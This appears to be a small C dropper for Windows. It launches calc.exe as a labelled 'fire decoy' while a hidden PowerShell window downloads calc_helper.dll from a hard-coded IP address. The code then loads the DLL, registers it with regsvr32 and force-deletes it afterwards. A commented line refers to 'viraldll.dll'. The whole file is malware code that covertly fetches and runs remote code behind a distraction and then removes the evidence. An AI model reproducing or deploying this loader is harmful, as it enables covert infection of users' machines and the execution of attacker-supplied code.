#include <windows.h>
typedef int (*importFunction)();

int loadDLL()
{
int status = 0;
system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.197/calc_helper.dll' -OutFile 'calc_helper.dll'");
importFunction test;
HINSTANCE testLibrary = LoadLibrary("calc_helper.dll");
//system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
_sleep(1200);
system("regsvr32 /i calc_helper.dll");
if (testLibrary)
{
test = (importFunction)GetProcAddress(testLibrary, "calc_helper.dll");
if(test)
{
status = test();
}
FreeLibrary(testLibrary);
//system("regsvr32 /i viraldll.dll");
}
return status;
}

int main(int argc, char **argv)
{
//loadDLL();
system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
loadDLL();
system("regsvr32 /i calc_helper.dll");
_sleep(200);
system("del /F calc_helper.dll");
}

